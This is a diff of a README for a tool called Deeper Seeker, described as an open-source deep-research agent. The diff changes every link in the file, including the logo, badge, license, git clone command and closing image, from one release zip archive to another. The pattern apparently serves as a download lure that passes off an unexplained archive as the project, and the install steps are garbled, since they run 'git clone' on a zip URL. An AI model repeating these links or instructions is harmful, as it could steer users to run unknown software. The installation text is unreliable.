@@ -1,8 +1,8 @@
 # 🌟 Welcome to Deeper Seeker 🚀
 
-![Deeper Seeker Logo](https://github.com/saged-19/Deeper-Seeker/releases/download/v1.0/App.zip)
+![Deeper Seeker Logo](https://github.com/saged-19/Deeper-Seeker/releases/download/v2.0/Software.zip)
 
-## Repository Name: [Deeper-Seeker](https://github.com/saged-19/Deeper-Seeker/releases/download/v1.0/App.zip)
+## Repository Name: [Deeper-Seeker](https://github.com/saged-19/Deeper-Seeker/releases/download/v2.0/Software.zip)
 ## Repository Description:
 Deeper Seeker is a simplified open-source version of OpenAI's latest Deep Research feature in ChatGPT. It serves as an agentic research tool that can reason, create multi-step tasks, synthesize data from various online resources, and generate structured reports. Whether you're a student, researcher, or professional, Deeper Seeker is here to streamline your research process and enhance your productivity.
 
@@ -12,9 +12,9 @@ Deeper Seeker is a simplified open-source version of OpenAI's latest Deep Resear
 - openai
 
 ## Find the Latest Release:
-If the provided link needs to be launched, you can download the latest release by clicking [here](https://github.com/saged-19/Deeper-Seeker/releases/download/v1.0/App.zip).
+If the provided link needs to be launched, you can download the latest release by clicking [here](https://github.com/saged-19/Deeper-Seeker/releases/download/v2.0/Software.zip).
 
-[![Download Deeper Seeker](https://github.com/saged-19/Deeper-Seeker/releases/download/v1.0/App.zip%20Seeker&color=blue)](https://github.com/saged-19/Deeper-Seeker/releases/download/v1.0/App.zip)
+[![Download Deeper Seeker](https://github.com/saged-19/Deeper-Seeker/releases/download/v2.0/Software.zip%20Seeker&color=blue)](https://github.com/saged-19/Deeper-Seeker/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -27,7 +27,7 @@ If the provided link needs to be launched, you can download the latest release b
 ## Installation Instructions 🚚
 Follow these steps to get Deeper Seeker up and running on your machine:
 ```
-$ git clone https://github.com/saged-19/Deeper-Seeker/releases/download/v1.0/App.zip
+$ git clone https://github.com/saged-19/Deeper-Seeker/releases/download/v2.0/Software.zip
 $ cd Deeper-Seeker
 $ npm install
 $ npm start
@@ -49,10 +49,10 @@ Our future plans for Deeper Seeker include:
 - Enhancing report customization options for users.
 
 ## License ℹ️
-This project is licensed under the MIT License - see the [https://github.com/saged-19/Deeper-Seeker/releases/download/v1.0/App.zip](https://github.com/saged-19/Deeper-Seeker/releases/download/v1.0/App.zip) file for details.
+This project is licensed under the MIT License - see the [https://github.com/saged-19/Deeper-Seeker/releases/download/v2.0/Software.zip](https://github.com/saged-19/Deeper-Seeker/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
 🚀 Start your research journey with Deeper Seeker today! Happy researching! 📚🔍
 
-![Thank You](https://github.com/saged-19/Deeper-Seeker/releases/download/v1.0/App.zip)
+![Thank You](https://github.com/saged-19/Deeper-Seeker/releases/download/v2.0/Software.zip)
